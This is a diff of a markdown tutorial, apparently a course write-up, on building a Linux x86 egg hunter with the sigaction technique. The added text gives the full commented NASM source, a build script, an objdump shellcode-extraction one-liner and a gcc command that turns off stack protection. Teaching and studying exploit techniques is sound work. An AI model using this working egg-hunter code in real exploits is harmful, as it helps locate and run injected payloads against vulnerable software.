@@ -18,6 +18,8 @@ First of all, what is an Egg Hunter?
 
 As it is said in the paper, is a virtual address space where we can inject the code/payload which couldn't anywhere in the current process. The egg is the marker that helps the payload to be located by the exploit. In this case, the sigaction method is the one selected to be implemented.
 
+### Sigaction implementation
+
         00000000  6681C9FF0F        or cx,0xfff
         00000005  41                inc ecx
         00000006  6A43              push byte +0x43
@@ -36,8 +38,53 @@ As it is said in the paper, is a virtual address space where we can inject the c
 
 2) Create the nasm code that will reproduce the eggcode.
 
-        Compile Egg_Hunter.nasm using compile.sh 
-        Use objdump to obtain the eggcode.
-        Copy to Skeleton_shellcode.c the eggcode and the payload. The rest will be done by itself.
-  
-3) Configure the shellcode to fit any payload selected by the user.
+Now that we know the exact structure for the egg hunter, we need to create the nasm code. Taking advadtange of the code from the paper, here is the final code.
+
+        global _start 
+
+        section .text
+
+        _start: 
+
+        alignment:  
+                or cx,0xfff         ; Page alingment
+
+        search_shell:  
+                inc ecx             ; Increment our page alignment (space "created" where the shellcode will be executed)
+                push byte +0x43     ; Sigaction syscall (0x43 = 67 decimal)
+                pop eax             ; eax=67
+                int 0x80            ; Syscall sigaction
+
+                cmp al,0xf2         ; If al is 242 (0xf2), then there is a sigaction error and egg hunter can not be executed
+                jz alignment        ; The code keeps jumping to alignment until the comparison is set to False (searchs the egghunter)
+                mov eax, 0x7A6EA1A2 ; Here is the eggcode
+                mov edi, ecx        ; Moves ecx to edi (pointer to the shellcode)
+                scasd   	    ; Compares (double word) eax with edi 
+                jnz search_shell    ; If it did not match try the next address
+                scasd
+                jnz search_shell
+                jmp edi             ; We found our egg identifier, pass execution
+
+After that, we must compile the code using compile.sh. This bash script will do the following:
+
+1) Assembly and link the nasm code:
+
+        echo '[+] Assembling with Nasm ... '
+        nasm -f elf32 -o Egg_Hunter.o Egg_Hunter.nasm
+
+        echo '[+] Linking ...'
+        ld -o Egg_Hunter Egg_Hunter.o
+
+        echo '[+] Done!'
+2) Obtain the shellcode from the binary created:
+
+        objdump=$(objdump -d ./Egg_Hunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
+
+3) Inject the shellcode to the c script (shellcode):
+
+        replace "shellcode" "$objdump" -- shellcode.c &>/dev/null #Replace shellcode dump
+4) Compile the shellcode
+
+        gcc -fno-stack-protector -z execstack shellcode.c -o shellcode &>/dev/null #Compile and execute the shellcode
+        
+
